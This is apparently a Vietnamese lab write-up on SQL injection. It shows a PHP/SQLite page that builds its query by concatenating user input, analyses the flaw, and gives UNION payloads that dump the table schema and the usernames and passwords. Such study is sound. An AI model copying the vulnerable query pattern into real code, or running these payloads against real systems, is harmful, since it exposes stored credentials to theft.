# Đoạn code xử lý logic
```php
<?php
session_start ();

ini_set('display_errors', 'on');
ini_set('error_reporting', E_ALL);

include 'anti_csrf.php';

init_token ();

class LevelOne {
    public function doQuery($injection) {
        $pdo = new SQLite3('database.db', SQLITE3_OPEN_READONLY);
        
        $query = 'SELECT id,username FROM users WHERE id=' . $injection . ' LIMIT 1';
        $getUsers = $pdo->query($query);
        $users = $getUsers->fetchArray(SQLITE3_ASSOC);

        if ($users) {
            return $users;
        }

        return false;
    }
}

if (isset ($_POST['submit']) && isset ($_POST['user_id'])) {
    check_and_refresh_token();

    $lo = new LevelOne ();
    $userDetails = $lo->doQuery ($_POST['user_id']);
}
?>
```

```HTML
<div class="container">
    <?php if (isset ($userDetails) && !empty ($userDetails)): ?>
        <div class="row">
            <p class="well"><strong>Username for given ID</strong>: <?php echo $userDetails['username']; ?> </p>
            <p class="well"><strong>Other User Details</strong>: <br />
                <?php 
                $keys = array_keys ($userDetails);
                $i = 0;
                foreach ($userDetails as $user) { 
                    echo $keys[$i++] . ' -> ' . $user . "<br />";
                } 
                ?> 
            </p>
        </div>
    <?php endif; ?>
    <div class="row">
        <label for="user_id">Enter the user ID:</label>
        <form name="username" method="post">
            <div class="form-group col-md-2">
                <input type="text" class="form-control" id="user_id" name="user_id" value="1" required>
            </div>
            <div class="col-md-2">
                <input type="submit" class="form-control btn btn-default" placeholder="Submit!" name="submit">
            </div>
            <input type="hidden" id="token" name="token" value="<?php echo $_SESSION['token']; ?>">
        </form>
    </div>
</div>
```

# Phân tích luông thực thi
Dữ liệu nhận vào được gán vào biến `user_input` (dòng 58) kèm 1 token chống CSRF (dòng 63)  
Dòng 32, tạo 1 biến `lo` có kiểu dl là class `LevelOne`  
Dòng 33, biến `lo` gọi hàm `doQuery` và truyền vào đó biến `user_input`. Kết quả sẽ lưu vào biến `userDetails`  
Trong `doQuery`, biến `pdo` được tạo ra để kết nối tới database  
Biến `query` được khởi tạo thông qua phương pháp nối chuỗi với `user_input`(lúc này là `injection`)  
Biến `getUsers` được gán kết quả của quá trình thực thi `query` thông qua `pdo`  
Biến `users` lấy giá trị từ hàng mà `getUsers` đang trỏ đến và được in ra tại dòng 48  

# Phân tích lỗ hổng
Vấn đề cốt lõi nằm ở dòng số 34, `query` được khởi tạo từ `user_input` mà không hề qua 1 bước tiền xử lý nào. Điều này có nghĩa là bất cứ giá trị gì được nhập vào `user_input` đều có thể được thực thi trực tiếp bởi `pdo`.

Trong trường hợp thông thường, khi ta nhập `1` vào ô `user_id` thì `query` sẽ có giá trị là `SELECT id,username FROM users WHERE id=1 LIMIT 1`. Tuy nhiên, khi ta thay đổi giá trị này thành `4 UNION SELECT 1,'admin'` thì `query` sẽ có giá trị là `SELECT id,username FROM users WHERE id=4 UNION SELECT 1,'admin' LIMIT 1`. Điều này sẽ khiến cho `pdo` thực thi câu truy vấn mới và trả về kết quả là `admin`.

**Tôi SELECT 4 là do giá trị 4 không tồn tại trong bảng do đó nó sẽ in ra kết quả của câu lệnh UNION**

# Payload exploit
* Lấy ra các bảng có trong db

`4 UNION SELECT name,sql FROM sqlite_master WHERE type='table'--`  
=> bảng `users`

* Khai thác bảng (đã biết SELECT bao nhiêu cột từ dòng 17 rồi)

`4 UNION SELECT username,password FROM users LIMIT 2,1-- ` 
